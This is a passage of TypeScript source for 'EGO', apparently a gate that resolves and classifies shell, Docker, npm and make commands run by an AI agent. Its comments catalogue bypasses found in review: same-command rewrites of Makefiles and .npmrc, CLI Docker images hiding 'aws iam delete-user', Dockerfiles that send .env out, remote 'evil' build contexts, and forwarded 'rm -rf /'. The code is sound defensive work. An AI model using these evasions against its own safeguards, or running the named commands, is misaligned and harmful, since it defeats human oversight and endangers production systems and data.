  // reach it at all: when the effective directory IS a registered root, that root is the subject.
  const direct = repoRootFor(ctx, dir);
  if (direct !== null && canonicalPath(dir) === direct) return direct;
  const top = gitToplevel(dir);
  if (top === null) return repoRootFor(ctx, dir);
  // the subject must be one EGO governs; a repository outside every registered root is not one it may read
  return repoRootFor(ctx, top) === null ? null : top;
}

/** The registered repository root containing `dir`, or null. */
function repoRootFor(ctx: EvaluationContext, dir: string): string | null {
  const d = canonicalPath(dir);
  let best: string | null = null;
  for (const r of ctx.repoRoots ?? []) {
    const root = canonicalPath(r);
    if ((d === root || d.startsWith(root + sep)) && (best === null || root.length > best.length)) best = root;
  }
  return best;
}

function resolveScriptCommand(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  norm: string,
  env: ExecutionEnvironment,
): ProducerResult {
  const tokens = tokenize(norm);
  const head = tokens[0] ?? '';
  const cwd = env.cwd;
  const written = env.written;
  /** A4 — FRESHNESS. A source rewritten by an earlier unit of the SAME command can no longer justify a later
   *  ALLOW: `printf 'build:\n\tgit push' > Makefile && make build` was classified from the old contents. */
  //  `\0any` is the wildcard: an EARLIER unit of this command could not be classified, so it may have written
  //  anything, and no later resolution in the same unit can be proven fresh. Enumerating writer commands would be
  //  the same losing game as enumerating shell spellings — `node -e`, `python -c`, `git checkout -- f`, a build
  //  step that regenerates its own makefile, all write files without being "write commands".
  // A PATH IS STALE WHEN IT OR ANY ANCESTOR WAS WRITTEN: `mv evil sub` replaces everything under `sub`, `cp x n` where n
  // does not exist yet may be creating a directory, and a link to a directory makes its whole tree a second name. The
  // comparison is case-folded because the filesystem is (`cp evil.mk MAKEFILE` writes `Makefile` on APFS).
  const stale = (...paths: string[]): boolean =>
    written.has('\0any') ||
    paths.some((p) => {
      const c = foldName(canonicalPath(p));
      for (const w of written) {
        if (w.startsWith('\0')) continue;
        const f = foldName(w);
        if (c === f || c.startsWith(f + '/')) return true;
      }
      return false;
    });

  // A3 — a semantic conclusion drawn from a RELATIVE path is only trustworthy when the directory it is relative to
  // has been proven. Absence of proof is not proof.
  if (!env.cwdVerified)
    return {
      kind: 'shell-script',
      key: `unverified:${norm}`,
      body: null,
      reason: 'the working directory this resolution depends on could not be verified',
      resolution: 'CONTEXT_UNVERIFIED',
    };
  // AN IMAGE THAT IS A CLI CARRIES THAT CLI'S COMMAND LINE. `docker run --rm -e AWS_… amazon/aws-cli iam
  // delete-user --user-name bob` runs the real AWS CLI against the real endpoint and deletes a production IAM
  // user; the bare `aws iam delete-user` is an absolute core deny that no human may approve, and wrapped in the
  // vendor's own image it ran under a container capability (exit review 7). Only the images whose ENTRYPOINT IS
  // the tool are read this way — the argv of an arbitrary image is not a command line this kernel can parse —
  // and the tool's own name is put back in front of it so the target model sees what it always sees.
  // THE MANAGEMENT GROUP IS OPTIONAL AND CHANGES NOTHING. `docker container run` IS `docker run` — the modern
  // CLI spells every verb both ways — and anchoring on `tokens[1]` saw only the short form, so the vendor's own
  // CLI image reached ALLOW again through the long one (exit review 9). The same shape as `docker image build`,
  // which was already handled; this makes the rule general instead of per-verb.
  const runAt = tokens.findIndex(
    (t, i) => i > 0 && /^(run|create)$/.test(t) && (i === 1 || DOCKER_GROUPS.test(tokens[i - 1] ?? '')),
  );
  if (/^(docker|podman|nerdctl)$/.test(head) && runAt > 0) {
    for (let i = runAt + 1; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (t.startsWith('-')) {
        if (DOCKER_RUN_VALUE_OPTS.test(t) && !t.includes('=')) i++;
        continue;
      }
      const tool = CLI_IMAGES.find(([re]) => re.test(imageName(t)));
      if (tool) {
        const argv = tokens.slice(i + 1);
        return {
          kind: 'shell-script',
          key: `cli-image:${t}`,
          body: argv.length ? [`${tool[1]} ${requote(argv)}`] : [],
          reason: `the image ${t} IS the ${tool[1]} command line`,
          resolution: 'RESOLVED_COMPLETE',
        };
      }
      // ...and the scan does NOT stop at the first bare operand: an option this kernel does not know consumes
      // its value, so `docker run --cgroup-parent foo amazon/aws-cli …` put `foo` where the image was expected
      // (exit review 8). The image names are specific enough that scanning every operand is safe.
      continue;
    }
  }
  // `docker buildx bake` BUILDS EVERY TARGET IN A BAKE FILE, and each target names its own Dockerfile. The file
  // is HCL or JSON and it is right there in the workspace, so the Dockerfiles it names are read exactly as
  // `docker build`'s is — `bake` was an unknown command and the `RUN git push origin main` in the Dockerfile it
  // selects was never seen (exit review 9). A bake file this kernel cannot read is opacity, not absence.
  const bakeAt = tokens.findIndex((t, i) => i > 0 && t === 'bake' && DOCKER_GROUPS.test(tokens[i - 1] ?? ''));
  if (/^(docker|podman|nerdctl)$/.test(head) && bakeAt > 0 && tokens.some((t) => t === '--print' || t === '--print=true')) {
    // `bake --print` PRINTS the resolved configuration as JSON and builds nothing (exit review 10)
    return { kind: 'shell-script', key: 'bake:print', body: null, reason: 'bake --print renders the configuration and builds nothing', resolution: 'NOT_A_PRODUCER' };
  }
  if (/^(docker|podman|nerdctl)$/.test(head) && bakeAt > 0) {
    const named = tokens
      .map((t, i) => (t === '-f' || t === '--file' ? tokens[i + 1] : /^(?:--file=|-f)(.+)$/.exec(t)?.[1]))
      .filter((f): f is string => typeof f === 'string' && f !== '');
    const candidates = named.length
      ? named
      : ['docker-bake.hcl', 'docker-bake.json', 'docker-bake.override.hcl', 'docker-compose.yml'];
    const texts: string[] = [];
    const unread: string[] = [];
    for (const f of candidates) {
      const abs = isAbsolute(f) ? f : resolve(cwd, f);
      const text = readInsideWorkspace(ctx, abs);
      if (text !== null) texts.push(text);
      else if (named.length || fileExists(abs)) unread.push(f);
    }
    if (!texts.length)
      return {
        kind: 'shell-script',
        key: `bake:${cwd}:${candidates.join(',')}`,
        body: null,
        reason: unread.length ? 'the bake file could not be read' : 'no bake file',
        resolution: unread.length ? 'UNREADABLE' : 'ABSENT_VERIFIED',
      };
    // `dockerfile = "X"` (HCL) and `"dockerfile": "X"` (JSON) name the file; `context` says where it sits
    const lines: string[] = [];
    const gaps: Unresolved[] = [];
    for (const text of texts) {
      const ctxDir = /(?:^|\n)\s*"?context"?\s*[:=]\s*"([^"]+)"/.exec(text)?.[1] ?? '.';
      const files = [...text.matchAll(/(?:^|\n)\s*"?dockerfile"?\s*[:=]\s*"([^"]+)"/g)].map((m) => m[1]!);
      for (const f of files.length ? files : [`${ctxDir}/Dockerfile`]) {
        const abs = resolve(cwd, isAbsolute(f) ? f : `${ctxDir}/${f}`.replace(/^\.\//, ''));
        const dt = readInsideWorkspace(ctx, abs);
        if (dt === null) gaps.push({ what: 'body', where: f, why: 'a Dockerfile this bake file names could not be read' });
        else lines.push(...dockerfileShellLines(dt));
      }
    }
    return {
      kind: 'shell-script',
      key: `bake:${cwd}:${fingerprint(texts.join('\n'))}`,
      body: lines,
      reason: gaps.length ? `bake targets; NOT fully resolved: ${gaps[0]!.why}` : 'bake targets',
      resolution: gaps.length ? 'PARTIAL' : 'RESOLVED_COMPLETE',
      containerPaths: true,
      ...(gaps.length ? { unresolved: gaps } : {}),
    };
  }
  // A DOCKERFILE IS A PRODUCER. `docker build .` executes every `RUN` line in the build context's Dockerfile —
  // as root, with the whole context copied in — and EGO resolved Makefiles, manifest scripts and shell scripts
  // while treating this one as an opaque `container.build`. A Dockerfile whose `RUN` line POSTs `.env` to a
  // remote host was ALLOW (exit review 7). It is read like any other producer: its shell lines are handed to the
  // canonical analysis, and a Dockerfile that cannot be read is opacity rather than absence.
  // `docker image build` is `docker build` through the management GROUP, and `docker buildx build` through the
  // plugin: the verb is the LAST word of the pair, not `tokens[1]` (exit review 8).
  const buildAt = tokens.findIndex(
    (t, i) => i > 0 && t === 'build' && (i === 1 || /^(image|buildx|builder)$/.test(tokens[i - 1] ?? '')),
  );
  if (/^(docker|podman|nerdctl|buildah)$/.test(head) && buildAt > 0) {
    // a glued short option keeps its `=`: `-f=Dockerfile.evil` names `Dockerfile.evil`, not `=Dockerfile.evil`
    const named = optionValue(tokens, 'f', ['--file'])?.replace(/^=/, '') ?? null;
    // `-f -` reads the Dockerfile from STANDARD INPUT. That is a stream — UNLESS the command line holds it, which
    // a heredoc does: `docker build -f - . <<EOF\nFROM alpine\nRUN git push origin main\nEOF` writes the whole
    // Dockerfile in plain sight, and calling it unreadable gave an absolute deny the approvable ASK of opacity
    // (exit review 8). A `< file` redirect names a file the kernel may also be able to read.
    if (named === '-') {
      const piped =
        env.stdinText ??
        (() => {
          const redir = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(env.rawSegment ?? norm)?.[1];
          if (redir === undefined || /[$`*?]/.test(redir)) return undefined;
          return readInsideWorkspace(ctx, isAbsolute(redir) ? redir : resolve(cwd, redir)) ?? undefined;
        })();
      if (piped === undefined)
        return {
          kind: 'shell-script',
          key: 'dockerfile:stdin',
          body: null,
          reason: 'the Dockerfile is read from standard input',
          resolution: 'UNREADABLE',
        };
      return {
        kind: 'shell-script',
        key: `dockerfile:stdin:${fingerprint(piped)}`,
        body: dockerfileShellLines(piped),
        reason: 'the Dockerfile arrives on standard input and the command line holds it',
        resolution: 'RESOLVED_COMPLETE',
        containerPaths: true,
      };
    }
    // the build CONTEXT is the last bare operand; `-` and a URL are contexts EGO cannot read
    // AN OPTION THIS KERNEL DOES NOT KNOW STILL TAKES ITS VALUE. Reading the LAST bare operand as the context
    // let `docker build . --no-cache-filter src` read `src` as the context, so the real Dockerfile was never
    // found. The context is the FIRST bare operand, which docker documents as the single PATH|URL|- argument.
    const after = tokens.slice(buildAt + 1);
    const operands = after.filter((t, i) => (t === '-' || !t.startsWith('-')) && !DOCKER_BUILD_VALUE_OPTS.test(after[i - 1] ?? ''));
    const context0 = operands[0];
    const context = context0 ?? '.';
    // `docker build -` reads the Dockerfile from STANDARD INPUT, and a URL context is fetched: neither is a file
    // this kernel can read, so neither can carry a positive claim. NAMING A FILE WITH `-f` DOES NOT CHANGE THAT:
    // the path is inside the fetched repository or the tarball on standard input, so `docker build -f Dockerfile
    // https://github.com/evil/repo.git` read the LOCAL Dockerfile - a file that is not the one that runs - and
    // called the build proven (exit review 10).
    if (/^(-$|https?:|git@|git:|git\+|ssh:|github\.com\/)/.test(context))
      return {
        kind: 'shell-script',
        key: `dockerfile:${context}`,
        body: null,
        reason: 'the build context is a stream or a remote URL, so its Dockerfile was never read',
        resolution: 'UNREADABLE',
      };
    // PODMAN'S DEFAULT BUILD FILE IS `Containerfile`, and it falls back to `Dockerfile`. Looking only for the
    // latter made `podman build .` on an ordinary podman project a proven absence over a file full of RUN lines.
    let dockerfile = named ?? `${context}/Dockerfile`;
    if (named === null && !fileExists(resolve(cwd, dockerfile)) && fileExists(resolve(cwd, `${context}/Containerfile`)))
      dockerfile = `${context}/Containerfile`;
    const abs = isAbsolute(dockerfile) ? dockerfile : resolve(cwd, dockerfile);
    if (stale(abs))
      return { kind: 'shell-script', key: `dockerfile:${abs}`, body: null, reason: 'the Dockerfile is rewritten earlier in the same command', resolution: 'STALE' };
    const text = readInsideWorkspace(ctx, abs);
    if (text === null) {
      // NO DOCKERFILE IS AN ABSENCE THAT WAS OBSERVED, not an opacity. `docker build .` in a directory that holds
      // no Dockerfile fails and executes nothing, and treating it as opaque would gate every `docker build` in a
      // repository that keeps its Dockerfile elsewhere — the proportionality half of the same contract.
      const dir = abs.slice(0, abs.lastIndexOf('/'));
      const listed = listDirectory(dir);
      if (!fileExists(abs) && listed !== null)
        return {
          kind: 'shell-script',
          key: `dockerfile:${abs}`,
          body: null,
          reason: `no Dockerfile in ${dockerfile.replace(/\/Dockerfile$/, '') || '.'}`,
          resolution: 'ABSENT_VERIFIED',
        };
      return {
        kind: 'shell-script',
        key: `dockerfile:${abs}`,
        body: null,
        reason: fileExists(abs)
          ? 'the Dockerfile is outside the workspace'
          : 'the build context directory could not be read',
        resolution: 'UNREADABLE',
      };
    }
    return {
      kind: 'shell-script',
      key: `dockerfile:${abs}`,
      body: dockerfileShellLines(text),
      containerPaths: true,
      reason: `Dockerfile ${dockerfile}`,
      resolution: 'RESOLVED_COMPLETE',
      provenance: { source: abs, fingerprint: fingerprint(text) },
    };
  }
  // shell scripts: ./x.sh, bash x.sh, sh x.sh, source x.sh, . x.sh, /abs/x.sh
  let scriptPath: string | null = null;
  if (/^\.{0,2}\//.test(head) || isAbsolute(head)) scriptPath = head;
  else if (
    (head === 'bash' || head === 'sh' || head === 'zsh' || head === 'source' || head === '.') &&
    tokens[1] &&
    !tokens.some((t) => t === '-c' || /^-[a-z]*c$/i.test(t))
  ) {
    const args = tokens.slice(1).filter((t) => !t.startsWith('-'));
    if (args[0]) scriptPath = args[0];
  }
  // `sh -n FILE` IS A SYNTAX CHECK: the shell PARSES the file and executes not one command of it. It is how an
  // author verifies a script BEFORE trusting it, and resolving the body as if it were going to run made that
  // verification carry the script's verdict — `bash -n run.sh` was an absolute deny over a command that reads
  // and reports (exit review 9). `-v` echoes without running only in combination; `-n` alone is the check.
  if (
    scriptPath !== null &&
    /^(bash|sh|zsh|dash|ksh)$/.test(head) &&
    tokens.some((t) => /^-[a-zA-Z]*n[a-zA-Z]*$/.test(t) || t === '--noexec')
  )
    return {
      kind: 'shell-script',
      key: `script:noexec:${scriptPath}`,
      body: null,
      reason: 'a syntax check parses the script and executes nothing',
      resolution: 'NOT_A_PRODUCER',
    };
  if (scriptPath !== null) {
    const abs = isAbsolute(scriptPath) ? scriptPath : resolve(cwd, scriptPath);
    if (stale(abs))
      {
        // WHAT WAS READ IS STILL HANDED OVER. Staleness says "this may not be what runs" — it does not say the
        // contents are harmless, and returning a null body threw away a body that had already been read. A
        // script holding an absolute deny then arrived as an approvable opacity the moment ANY earlier segment
        // of the same command line could not be classified, which the wildcard ledger entry makes easy:
        // `if false; then ./decoy.sh() { :; }; fi; ./decoy.sh` was ASK (self-attack on exit review 9). The
        // staleness is recorded as an unresolved gap, so the verdict is the STRONGER of the two — which is the
        // same rule the make producer already follows for a line it could only partly expand.
        const staleText = readInsideWorkspace(ctx, abs);
        const staleBody = staleText === null ? null : scriptSegments(staleText);
        return {
          kind: 'shell-script',
          key: `script:stale:${abs}`,
          body: staleBody,
          bodyEnv: env,
          oneShell: true,
          reason: 'this script is rewritten earlier in the same command, so its analysed contents are not what runs',
          resolution: staleBody ? 'PARTIAL' : 'STALE',
          unresolved: [{ what: 'body', where: abs, why: 'the script is rewritten earlier in the same command' }],
        };
      }
    const text = readInsideWorkspace(ctx, abs);
    if (text === null)
      return {
        kind: 'shell-script',
        key: `script:${abs}`,
        body: null,
        reason: 'script not readable inside the workspace',
        resolution: fileExists(abs) ? 'UNREADABLE' : 'ABSENT_VERIFIED',
      };
    if (
      !/^#!.*\b(sh|bash|zsh|dash|ksh)\b/.test(text) &&
      !/\.(sh|bash|zsh)$/.test(abs) &&
      head !== 'bash' &&
      head !== 'sh' &&
      head !== 'zsh' &&
      head !== 'source' &&
      head !== '.'
    ) {
      return {
        kind: 'shell-script',
        key: `script:${abs}`,
        body: null,
        reason: 'executable is not a shell script',
        resolution: 'UNSUPPORTED',
      };
    }
    const body = scriptSegments(text);
    return {
      kind: 'shell-script',
      key: `script:${abs}`,
      body,
      bodyEnv: env,
      oneShell: true,
      reason: body ? 'shell script analysed' : 'shell script uses dynamic commands',
      resolution: body ? 'RESOLVED_COMPLETE' : 'DYNAMIC',
      provenance: { source: abs, fingerprint: fingerprint(text) },
    };
  }
  // package manager scripts
  if (head === 'npm' || head === 'pnpm' || head === 'yarn' || head === 'bun') {
    // A workspace/prefix/filter selector changes WHICH manifest the script comes from. EGO does not model the
    // workspace graph, so reading the root manifest would be a confident wrong answer.
    // `--ws` IS `--workspaces`, `-ws` is the single-dash spelling npm accepts for it, and `--workspaces=true`
    // is the explicit form — none of which the exact-match list held, so `npm run build --ws` ran the script in
    // EVERY workspace package while EGO resolved only the root manifest (exit review 9). The `=false` forms are
    // the opposite instruction and must NOT select anything.
    const selector = tokens.find(
      (t) =>
        /^(-w|--workspace|--workspaces|--ws|-ws|--include-workspace-root|--filter|-F|--prefix|-C|--dir|--cwd|--scope|--recursive|-r)$/.test(t) ||
        /^(--workspace|--filter|--prefix|--dir|--cwd|--scope)=/.test(t) ||
        (/^(--workspaces|--ws|--include-workspace-root)=/.test(t) && !/=(false|0|no)$/i.test(t)),
    );
    // ...and the same instruction lives in `.npmrc`, which npm reads from the package directory upwards. A flag
    // on the command line was modelled and the FILE that sets the identical key was not — the same gap this
    // producer already closed once for `script-shell`.
    const wsRc = ['.npmrc', '.yarnrc.yml', '.yarnrc']
      .map((n) => findUp(ctx, cwd, n))
      .find((f) => f !== null && f !== SEARCH_EXHAUSTED);
    const wsRcText = wsRc ? readInsideWorkspace(ctx, wsRc) : null;
    const rcSelectsWorkspaces =
      wsRcText !== null && /^\s*workspaces\s*[:=]\s*(true|1|yes)\s*$/im.test(wsRcText) ? wsRc! : null;
    if (rcSelectsWorkspaces && !selector)
      return {
        kind: 'npm-script',
        key: `npm:selector:${rcSelectsWorkspaces}`,
        body: null,
        reason: `${rcSelectsWorkspaces} sets workspaces=true, so the script runs in every workspace package`,
        resolution: 'UNSUPPORTED',
      };
    if (selector)
      return {
        kind: 'npm-script',
        key: `npm:selector:${selector}`,
        body: null,
        reason: `the ${selector} selector chooses a manifest outside the resolved working directory`,
        resolution: 'UNSUPPORTED',
      };
    let script: string | null = null;
    let scriptAt = -1;
    const sub = tokens[1] ?? '';
    // npm accepts a long list of aliases for install, including the deliberate typo `isntall`; `npm it` is
    // install-test. Missing one meant the ambient closure was skipped entirely and the install reached ALLOW
    // (challenge 6, finding 33). Taken from npm-install(1) and npm-ci(1) rather than guessed.
    const INSTALL_SUBS = new Set([
      'install', 'i', 'in', 'ins', 'inst', 'insta', 'instal', 'isnt', 'isnta', 'isntal', 'isntall',
      'install-test', 'it', 'install-ci-test', 'cit', 'clean-install', 'clean-install-test',
      'ci', 'add', 'update', 'up', 'upgrade', 'udpate', 'rebuild', 'rb',
    ]);
    if (INSTALL_SUBS.has(sub) || (head === 'yarn' && sub === '')) {
      const pkgPath0 = findUp(ctx, cwd, 'package.json', true);
      const pkgPath = pkgPath0 === SEARCH_EXHAUSTED ? null : pkgPath0;
      if (pkgPath0 === SEARCH_EXHAUSTED)
        return {
          kind: 'npm-script',
          key: `npm:${cwd}:${script}`,
          body: null,
          reason: 'the search for a manifest was cut off before it could reach one',
          resolution: 'PARTIAL',
        };
      const text = pkgPath ? readInsideWorkspace(ctx, pkgPath) : null;
      if (pkgPath === null || text === null) return manifestUnresolved(ctx, pkgPath, 'npm:install', 'package.json');
      let scripts: Record<string, unknown> = {};
      try {
        scripts = (JSON.parse(text) as { scripts?: Record<string, unknown> }).scripts ?? {};
      } catch {
        return { kind: 'npm-script', key: 'npm:install', body: null, reason: 'package.json unparsable', resolution: 'UNREADABLE' };
      }
      const names = ['preinstall', 'install', 'postinstall', 'prepare', 'prepublish', 'preprepare', 'postprepare'].filter(
        (n) => typeof scripts[n] === 'string',
      );
      const body = names.map((n) => scripts[n] as string); // pre/main/post are separate processes
      // A5 — the install's execution closure includes the DEPENDENCY TREE's lifecycle scripts, which EGO cannot
      // read. `--ignore-scripts` is the one spelling that provably runs none of them.
      // ONLY `--ignore-scripts` is real. npm silently ignores `--no-scripts` and runs every lifecycle script, so
      // accepting it was a positive claim that had not been earned (challenge 6, finding 34).
      // THE LAST SPELLING ON THE LINE WINS, as it does for every npm boolean: `--ignore-scripts
      // --no-ignore-scripts` runs every lifecycle script, and a `some()` read the first one and stopped
      // (exit review 8).
      const ignore = tokens.reduce<boolean>((acc, t) => {
        if (t === '--ignore-scripts' || t === '--ignore-scripts=true') return true;
        if (t === '--no-ignore-scripts' || t === '--ignore-scripts=false') return false;
        return acc;
      }, false);
      if (!ignore)
        return {
          kind: 'npm-script',
          key: `npm:${pkgPath ? dirname(pkgPath) : cwd}:install`,
          body: body.length ? body : null,
          bodyEnv: childEnvironment(env, { cwd: dirname(pkgPath), cwdVerified: env.cwdVerified }),
          reason: 'install runs the dependency tree’s lifecycle scripts, which EGO cannot read (--ignore-scripts runs none)',
          resolution: 'AMBIENT_UNRESOLVED',
        };
      // --ignore-scripts and no local lifecycle script: the manifest was fully read, so absence is PROVEN
      if (!body.length)
        return {
          kind: 'npm-script',
          key: `npm:install:none`,
          body: null,
          reason: 'no lifecycle script and --ignore-scripts',
          resolution: 'ABSENT_VERIFIED',
        };
      return {
        kind: 'npm-script',
        key: `npm:${dirname(pkgPath)}:install`,
        body,
        bodyEnv: childEnvironment(env, { cwd: dirname(pkgPath), cwdVerified: env.cwdVerified }),
        reason: 'install lifecycle scripts',
        resolution: 'RESOLVED_COMPLETE',
        provenance: { source: pkgPath, fingerprint: fingerprint(text) },
      };
    }
    // THE SCRIPT'S POSITION IS THE ONE THE PARSE REACHED, not the first token that spells it. `npm run run`
    // names a script called `run`, and `tokens.indexOf(script)` below found the SUBCOMMAND instead — so the
    // script name itself was forwarded as an argument and appended to the body. A spurious trailing word moves
    // the LAST OPERAND of whatever the script runs: `ln -s ../.harness k` became `ln -s ../.harness k run`, and
    // the link's directory was read from `run` (self-attack on exit review 9, found by the cross-product).
    if (sub === 'run' || sub === 'run-script') {
      const at = tokens.findIndex((t, i) => i >= 2 && !t.startsWith('-'));
      script = at >= 0 ? tokens[at]! : null;
      scriptAt = at;
    }
    else if (sub === 'test' || sub === 'start' || sub === 'stop' || sub === 'restart') script = sub;
    else if (
      (head === 'yarn' || head === 'pnpm' || head === 'bun') &&
      sub &&
      !sub.startsWith('-') &&
      !PACKAGE_MANAGER_BUILTINS.has(sub)
    )
      script = sub;
    if (script === null) {
      // `npm init <initializer>` / `yarn create <pkg>` acquire and RUN a package; with no argument they only
      // write a manifest. The npm producer claimed the head and answered "not a script", which never reached the
      // vocabulary that classifies acquiring third-party code (exit review 2).
      if (/^(init|create)$/.test(sub) && tokens.slice(2).some((t) => !t.startsWith('-')))
        return {
          kind: 'npm-script',
          key: `npm:${sub}:${tokens[2]}`,
          body: null,
          reason: `${head} ${sub} downloads and runs an initializer package`,
          resolution: 'AMBIENT_UNRESOLVED',
          unresolved: [{ what: 'ambient', where: tokens[2] ?? sub, why: 'an initializer acquired at run time' }],
        };
      return { kind: 'none', key: `npm:${sub}`, body: null, reason: 'not a script invocation', resolution: 'ABSENT_VERIFIED' };
    }
    const pkgPathRaw = findUp(ctx, cwd, 'package.json', true);
    const pkgPath = pkgPathRaw === SEARCH_EXHAUSTED ? null : pkgPathRaw;
    if (pkgPathRaw === SEARCH_EXHAUSTED)
      return {
        kind: 'npm-script',
        key: `npm:${cwd}:exhausted`,
        body: null,
        reason: 'the search for a manifest was cut off before it could reach one',
        resolution: 'PARTIAL',
      };
    if (pkgPath !== null && stale(pkgPath))
      return {
        kind: 'npm-script',
        key: `npm:${pkgPath}:${script}`,
        body: null,
        reason: 'package.json is rewritten earlier in the same command, so its analysed contents are not what runs',
        resolution: 'STALE',
      };
    const text = pkgPath ? readInsideWorkspace(ctx, pkgPath) : null;
    if (pkgPath === null || text === null) return manifestUnresolved(ctx, pkgPath, `npm:${script}`, 'package.json');
    let scripts: Record<string, unknown> = {};
    try {
      scripts = (JSON.parse(text) as { scripts?: Record<string, unknown> }).scripts ?? {};
    } catch {
      return { kind: 'npm-script', key: `npm:${script}`, body: null, reason: 'package.json unparsable', resolution: 'UNREADABLE' };
    }
    const names = [`pre${script}`, script, `post${script}`].filter((n) => typeof scripts[n] === 'string');
    if (!names.includes(script)) {
      if (script === 'start' && head === 'npm')
        return {
          kind: 'npm-script',
          key: `npm:${script}`,
          body: ['node server.js'],
          reason: 'npm start default',
          resolution: 'RESOLVED_COMPLETE',
        };
      // the manifest was fully read and genuinely has no such script: nothing executes. This is the narrow case
      // where absence is PROVEN, and the only one that keeps a declared ALLOW.
      return {
        kind: 'npm-script',
        key: `npm:${script}`,
        body: null,
        reason: `script "${script}" not found in package.json`,
        resolution: 'ABSENT_VERIFIED',
      };
    }
    // ONE ENTRY PER SCRIPT, NOT PER SEGMENT. Pre-splitting here projected the model away twice over: a pipeline
    // EDGE inside a script was lost, so `echo 'git push origin main' | sh` in a package script asked instead of
    // being denied; and each segment became its own UNIT, i.e. its own shell, so a `cd` on the left of an `&&`
    // did not reach the right of it. `pre`, the script and `post` ARE separate processes and stay separate
    // entries; what happens inside one of them is one shell, and splitting it is the analyzer's job.
    // NPM APPENDS WHAT FOLLOWS `--` TO THE SCRIPT BODY. `npm run build -- deploy` runs `make build deploy`, so
    // the process that actually runs carries a goal the manifest never mentions: `deploy` pushed to the remote,
    // `prodk` deleted a production pod and `nuke` was `rm -rf /`, all at ALLOW, because only the manifest string
    // was resolved and every remaining token was discarded (exit review 7). The forwarded words go to the MAIN
    // script only — `pre` and `post` are separate processes and npm passes them nothing.
    // NPM FORWARDS POSITIONALS WITH OR WITHOUT `--`. The separator only stops npm parsing FLAGS; a bare word
    // after the script name is passed to the script either way, so `npm run build prodk` really runs
    // `make build prodk` and `npm test deploy` runs the test script with `deploy` appended (exit review 8).
    const dd = tokens.indexOf('--');
    const nameAt = scriptAt >= 0 ? scriptAt : script === null ? -1 : tokens.indexOf(script);

    const forwarded =
      dd >= 0
        ? tokens.slice(dd + 1)
        : nameAt > 0
          ? tokens.slice(nameAt + 1).filter((t) => !t.startsWith('-'))
          : [];
    const body = names.map((n) =>
      n === script && forwarded.length ? `${scripts[n] as string} ${requote(forwarded)}` : (scripts[n] as string),
    );
    // npm accepts its configuration as flags anywhere on the line, including AFTER the script name, and
    // `--script-shell` re-points the interpreter of every script (challenge 8, finding 3)
    const npmFlags = tokens.filter((t) =>
      /^--(script-shell|node-options|shell|ignore-scripts=false|foreground-scripts|userconfig|globalconfig|prefix)(=|$)/.test(t),
    );
    // the same settings live in `.npmrc` / `.yarnrc.yml`, which npm reads from the package directory upwards.
    // A flag on the command line was modelled and the FILE that sets the identical key was not (challenge 8).
    const rcFile = ['.npmrc', '.yarnrc.yml', '.yarnrc']
      .map((n) => findUp(ctx, cwd, n))
      .find((f) => f !== null && f !== SEARCH_EXHAUSTED);
    const rcText = rcFile ? readInsideWorkspace(ctx, rcFile) : null;
    // A CONFIGURATION FILE THIS COMMAND REWRITES IS NOT THE ONE npm WILL READ. `printf 'script-shell=/tmp/evil.sh'
    // > .npmrc && npm run build` hands every package script to a different interpreter, and the rc text this
    // resolver read is the PRE-IMAGE — it said nothing about script-shell, so nothing was recorded (exit
    // review 9). The candidate NAMES are tested, because the file may not exist yet either.
    // npm reads the rc file from the package directory UPWARDS, so a write in an ancestor is a write to the
    // file this command will read: `printf … > .npmrc && cd sub && npm run build` rewrites the one npm finds
    // from `sub` (self-attack on exit review 9). Every directory from the cwd to each repository root is tested.
    const rcDirs: string[] = [];
    for (let d = cwd; ; d = dirname(d)) {
      rcDirs.push(d);
      if (d === dirname(d) || (ctx.repoRoots ?? []).some((r) => canonicalPath(r) === canonicalPath(d))) break;
    }
    const rcStale =
      (rcFile !== null && rcFile !== undefined && stale(rcFile)) ||
      rcDirs.some((d) => ['.npmrc', '.yarnrc.yml', '.yarnrc'].some((n) => stale(join(d, n))));
    if (rcStale)
      return {
        kind: 'npm-script',
        key: `npm:rc-stale:${cwd}`,
        body: null,
        reason: 'an npm configuration file is written earlier in the same command, so what was read is not what runs',
        resolution: 'STALE',
      };
    const rcRebinds =
      rcFile !== null && rcFile !== undefined && (rcText === null || /^\s*(script-shell|node-options|shell|scriptShell|yarnPath|plugins)\s*[:=]/m.test(rcText))
        ? [rcFile]
        : [];
    return {
      kind: 'npm-script',
      ...(npmFlags.length || rcRebinds.length
        ? {
            unresolved: [
              ...npmFlags.map((f) => ({
                what: 'binding' as const,
                where: f,
                why: 'an npm configuration flag re-points the interpreter this script runs in',
              })),
              ...rcRebinds.map((f) => ({
                what: 'config' as const,
                where: f,
                why: 'this file re-points the interpreter every package script runs in',
              })),
            ],
          }
        : {}),
      key: `npm:${dirname(pkgPath)}:${script}:${forwarded.join('\u0000')}`,
      body,
      bodyEnv: childEnvironment(env, {
        cwd: dirname(pkgPath),
        cwdVerified: env.cwdVerified,
        config: { read: [pkgPath], unresolved: [] },
        sources: { [pkgPath]: fingerprint(text) },
      }),
      reason:
        npmFlags.length || rcRebinds.length
          ? `package.json script "${script}"; NOT fully resolved: ${npmFlags[0] ?? rcRebinds[0]}`
          : `package.json script "${script}"`,
      resolution: npmFlags.length || rcRebinds.length ? 'PARTIAL' : 'RESOLVED_COMPLETE',
      provenance: { source: pkgPath, fingerprint: fingerprint(text) },
    };
  }
  // make targets
  if (head === 'make' || head === 'gmake') {
    // (the head is resolved by the normalizer, which strips wrappers; `nice -n 10 make deploy` reaches here as
    //  `make deploy` — but a wrapper the normalizer does NOT strip would leave `head` wrong, which is why the
    //  producer cross-product carries every wrapper transformation)
    const targets: string[] = [];
    const cliRebinds: string[] = [];
    const cliInputs: string[] = [];
    const cliVars = new Map<string, string>();
    // THE QUOTING IS ONLY IN THE RAW SEGMENT. Normalization de-quotes, so `make V="docker --context production rm
    // -f app" run` reaches the scan below as eight bare words: the override kept only `docker`, `--context` and
    // `production` became goals, and `-f app` was read as make's own `--file` option — which made the resolver
    // read a makefile that does not exist and PROVE the target absent, laundering the command (exit review 5).
    // ...and the GOALS are read from the raw tokens too, because there an assignment is still ONE word. Matching
    // the normalized words against a SET of the words seen inside assignment values dropped any goal that
    // happened to share a word with one: `make NOTE="run deploy" deploy` lost its real goal and resolved the
    // DEFAULT one, so a recipe with `git push origin main` in it reached ALLOW (exit review 9). A word is part
    // of an assignment because of WHERE it is, not because of what it says.
    // ...AND THE RAW SEGMENT STILL HAS THE WRAPPER THE NORMALIZER STRIPPED. `nice -n 10 make deploy` reaches
    // the producer as `make deploy`, but its raw form starts at `nice`, so reading the goals from raw token 1
